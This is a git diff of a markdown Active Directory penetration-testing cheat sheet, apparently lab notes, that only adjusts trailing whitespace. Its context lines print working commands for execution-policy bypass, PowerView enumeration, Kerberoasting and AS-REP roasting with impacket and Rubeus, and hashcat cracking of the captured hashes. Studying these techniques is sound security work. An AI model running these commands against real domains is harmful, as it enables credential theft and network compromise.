@@ -1068,7 +1068,7 @@ Login to DC
   ```
 - 🖥️**Automated script - PowerView.ps1**
   - ❗ `powershell -ep bypass`
-  - Import PowerView to memory
+  - Import PowerView to memory  
     `PS C:\Tools> Import-Module .\PowerView.ps1`  
   - Users, groups, computer  
     ```
@@ -1204,7 +1204,7 @@ Login to DC
     `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
   - Alternate tool - impacket-GetUserSPNs  
     `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
-  - Python
+  - Python  
     `kali@kali:~$ GetUserSPNs.py -request -dc-ip 192.168.188.70 corp.com/`
 - AS-REP roast (accounts without preauth)
   - **DC1 pete**  
@@ -1221,7 +1221,7 @@ Login to DC
     `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
   - Alternate tool - Rubeus  
     `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`
-  - Python
+  - Python  
     `kali@kali:~$ GetNPUsers.py -usersfile usernames.txt -dc-ip 192.168.188.70 -format hashcat -outputfile hashes.asreproast corp.com/`  
 - Silver tickets (Forge service tickets)
 - Domain controller synchonization  
